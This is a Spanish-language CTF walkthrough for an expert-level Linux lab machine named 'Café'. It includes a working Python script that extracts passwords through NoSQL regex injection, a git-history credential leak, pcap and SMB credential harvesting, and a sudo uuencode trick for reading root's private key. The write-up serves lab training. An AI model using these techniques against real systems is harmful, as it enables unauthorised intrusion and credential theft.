## ⚙️ CTF:

<img width="1024" height="1024" alt="00_Café" src="https://github.com/user-attachments/assets/6b48c4cb-8bc1-4851-ab4a-f52f5f72e9fa" />

🪪 Nombre: Café

🛜 SO: Linux 

🔊 Dificultad: Experto

👥 Creadores: d4redevil

## 🔐 CONTACTO

[![Telegram](https://img.shields.io/badge/-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/wvverez)
[![Twitter](https://img.shields.io/badge/-Twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/wvverez)

## 📋 ENUMERACIÓN 

Empezamos con un escaneo nmap para ver versiones servicios y puertos abiertos que corren.

<img width="1111" height="648" alt="01_cafe" src="https://github.com/user-attachments/assets/262d0841-09fa-4fc5-8e4b-8d13c91677ea" />

Bien vemos el puerto 21 donde corre ftp, el 22 en el que corre OpenSSH y el puerto 80 que corre http donde tenemos una página llamada "El Templo Del Café" vamos a echarle un vistazo.

En la página no tiene mucho menos un panel de reservaciones en el que teníamos un panel de login.

<img width="848" height="789" alt="02_cafe" src="https://github.com/user-attachments/assets/22ac81f6-91de-4206-b170-4c57e29f4117" />

## 🤔 RECONOCIMIENTO
Vamos a interceptarnos la solicitud con burp, bueno vemos que usa el Método POST y en texto sin formato 

Con lo cual una forma que tenemos para explotarlo es mediante NoSQL Injetion, probé con SQLi también y XSS pero no hubo forma, si ponemos not equal vemos que nos redirige a "panel.php".

<img width="548" height="473" alt="03_cafe" src="https://github.com/user-attachments/assets/8e312057-a493-4fe0-9797-d5b5b8afe123" />

Vamos a buscar usuarios vamos a irnos al intruder de burp y con una lista de usuarios y el condicional $eq y $ne cuando algún usuario del diccionario sea válido responderá con código de estado 302.

<img width="619" height="368" alt="04_café" src="https://github.com/user-attachments/assets/33d5df08-623e-4c9f-b590-557e978b2dbd" />
<img width="755" height="81" alt="05_café" src="https://github.com/user-attachments/assets/35f1f6a6-49b4-47da-833a-f3fd34b4a847" />

Vemos 2 usuarios, Daniel y Kurt, ahora para la contraseña, como tenemos los usuarios podemos jugar con $eq y con regex para ir iterando cada caracter de la password para ello usaremos este script en python3

<pre>
  <code>
    import requests
import string

# Character set: a-z, A-Z, 0-9
charset = string.ascii_letters + string.digits

# URL
url = "http://192.168.178.112/reservation.php"

# Known username
username = "daniel"

# Cookie from request
cookies = {
    "PHPSESSID": "1b48960e1166fc9a5120b719555bef48"
}

# Headers
headers = {
    "Host": "192.168.91.140",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://192.168.178.112",
    "Connection": "keep-alive",
    "Referer": "http://192.168.178.112/reservation.php",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
}

# Start with known prefix, or empty string
known_password = ""

print("[*] Starting password brute force...")

while True:
    found = False
    for char in charset:
        attempt = known_password + char
        data = {
            "username[$eq]": username,
            "password[$regex]": f"^{attempt}"
        }

        response = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)

        if response.status_code == 302:
            known_password += char
            print(f"[+] Found character: {char} → {known_password}")
            found = True
            break

    if not found:
        print(f"[✓] Password appears to be fully discovered: {known_password}")
        break
  </code>
</pre>

Con esto podemos saber la contraseña de Daniel y cambiando el usuario, de Kurt.

Daniel password:

<img width="711" height="451" alt="06_Café" src="https://github.com/user-attachments/assets/ddc6577f-8003-433e-9902-6bf86fc48302" />

Kurt password:

<img width="807" height="466" alt="07_Café" src="https://github.com/user-attachments/assets/757d0281-178a-4513-8e40-f4a1ef00e187" />

## 💥EXPLOTACIÓN
Con las credenciales de Kurt vamos a acceder por ssh. Aquí he encontrado el .git de la aplicación.

<img width="963" height="803" alt="08_Café" src="https://github.com/user-attachments/assets/b395acfc-9b20-49b9-8234-d70259676827" />

Así que bueno vamos a listarnos los logs. Lo haremos de esta forma:

<pre>
  <code>
    git config --global --add safe.directory /home/daniel/stock_app/.git
    /home/daniel/stock_app/.git
    git log --oneline -10 
  </code>
</pre>

<img width="1291" height="142" alt="09_Café" src="https://github.com/user-attachments/assets/26abd9a0-1501-448e-b00a-3dc98d74570a" />

Aquí tenemos 2 commits y tenemos sus IDs con lo cual podemos verlos, vamos a verlos. 

Y tenemos una contraseña.

<img width="1203" height="466" alt="010_Café" src="https://github.com/user-attachments/assets/0bd1027f-4c85-4e14-a47e-102cc7a85fa5" />

Vamos a reutilizarla con alguno de los usuarios por ejemplo con daniel y funcionó.

<img width="1037" height="177" alt="011_Café" src="https://github.com/user-attachments/assets/ea6b6625-d9d5-416e-ab56-db780239dba1" />

Lo siguiente que haremos será filtrar desde la raíz por archivos legibles en el que el usuario sea root y el grupo daniel y encontramos este archivo.

<img width="861" height="99" alt="012_Café" src="https://github.com/user-attachments/assets/075fdedf-5685-4841-aca6-b49042e7077c" />

Esta extensión .cap es una captura de wireshark, así que me lo paso a mi sistema y vamos a ver que puede ser, nos montamos un servidor en python y nos lo mandamos a nuestra máquina.

<img width="1853" height="432" alt="013_café" src="https://github.com/user-attachments/assets/c806a731-adb3-4788-bc60-865a4f997446" />

Bien una vez lo tenemos vamos a pasarnoslo a nuestro wireshark para ver que puede contener.

Bueno buscando un poco encontramos en una consulta de FTP una solicitud que pone PASS: y una contraseña.

<img width="873" height="596" alt="014_café" src="https://github.com/user-attachments/assets/486ef019-90f9-4378-9e53-3b7f88731097" />

En este caso era la contraseña del usuario Sofía.

<img width="427" height="118" alt="015_café" src="https://github.com/user-attachments/assets/8445924f-087e-4b81-b022-d51454f75d0d" />

En el escaneo nmap que hicimos al principio habiamos podido ver que hay un samba así que vamos a probar estas credenciales para ver si son validas.

<img width="893" height="362" alt="016_café" src="https://github.com/user-attachments/assets/abe1edfd-806e-4c20-b984-e6ea141bb719" />

Tenemos acceso a finanzas, lectura y escritura. A continuación vamos a usar los siguientes comandos para poder descargarnos el excel.

<pre>
  <code>
    smbclient //192.168.91.140/finanzas -U sofia
  </code>
</pre>

<pre>
  <code>
    get finanzas.xlsx
  </code>
</pre>


<img width="627" height="303" alt="017_Café" src="https://github.com/user-attachments/assets/893b0526-5ef9-4307-ad88-47c38c992731" />

Vamos a descomprimirnos el excel y vamos a probar a filtrar por password o contraseña, palabras relacionadas a ver que encontramos.

Buscando encontramos que hay varias contraseñas del usuario "Ana".

Acabamos encontrando la contraseña del usuario Ana despues de bastantes pruebas. Una vez nos metemos vamos a ver los sudoers del usuario Ana y vemos que tenemos asociado el binario "uuencode"

## 🧗‍♂️ESCALADA DE PRIVILEGIOS

<img width="925" height="214" alt="018_Café" src="https://github.com/user-attachments/assets/1653f440-a862-47e9-a3f7-978f05112861" />

Para abusar de este privilegio como sudo podemos hacerlo de esta forma.

<pre>
  <code>
    LFILE=file_to_read
    sudo uuencode "$LFILE" /dev/studout | uudecode
  </code>
</pre>

Y habríamos conseguido el id_rsa vamos a darle permisos de ejecución 600.

<img width="732" height="334" alt="019_Café" src="https://github.com/user-attachments/assets/f293d826-67d8-4890-99ac-7e2a5c6d88c9" />

Y vamos a probar a acceder como root bypasseando la contraseña gracias al id_Rsa.

<img width="871" height="326" alt="020_Café" src="https://github.com/user-attachments/assets/8b309061-ad30-422b-b716-430354db51da" />

Y ya estaríamos como root.

Salud ^^
